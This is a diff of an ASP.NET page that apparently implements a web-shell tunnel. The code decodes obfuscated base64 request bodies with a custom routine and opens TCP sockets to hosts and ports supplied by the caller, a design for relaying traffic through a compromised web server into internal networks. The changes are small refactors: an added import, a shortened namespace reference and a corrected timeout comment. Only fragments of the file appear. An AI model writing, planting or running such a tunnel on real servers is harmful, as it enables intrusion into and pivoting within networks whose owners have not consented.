@@ -1,6 +1,7 @@
 <%@ Page Language="C#" EnableSessionState="True"%>
 <%@ Import Namespace="System.IO" %>
 <%@ Import Namespace="System.Net" %>
+<%@ Import Namespace="System.Text" %>
 <%@ Import Namespace="System.Net.Sockets" %>
 <%@ Import Namespace="System.Collections" %>
 <script runat="server">
@@ -34,7 +35,7 @@
             dataInput.Read(v, 0, v.Length);
             i += ( 5 + l );
             if ( b < 8 && b > 0 ) {
-                info[b] = System.Text.Encoding.Default.GetString(v);
+                info[b] = Encoding.Default.GetString(v);
             } else {
                 info[b] = v;
             }
@@ -115,7 +116,7 @@
     if (Request.ContentLength != -1) {
         byte[] buff = new byte[Request.ContentLength];
         Request.InputStream.Read(buff, 0, buff.Length);
-        string b64 = StrTr(System.Text.Encoding.Default.GetString(buff), de, en);
+        string b64 = StrTr(Encoding.Default.GetString(buff), de, en);
         byte[] data = Convert.FromBase64String(b64);
         info = blv_decode(data);
     }
@@ -174,7 +175,7 @@
                 System.Net.IPEndPoint remoteEP = new IPEndPoint(ip, port);
                 Socket sender = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
 
-                // set the connect timeout to 3 seconds, default 20 seconds
+                // set the connect timeout to 2 seconds, default 20 seconds
                 IAsyncResult result = sender.BeginConnect(remoteEP,null,null);
                 bool success = result.AsyncWaitHandle.WaitOne( 2000, true );
 
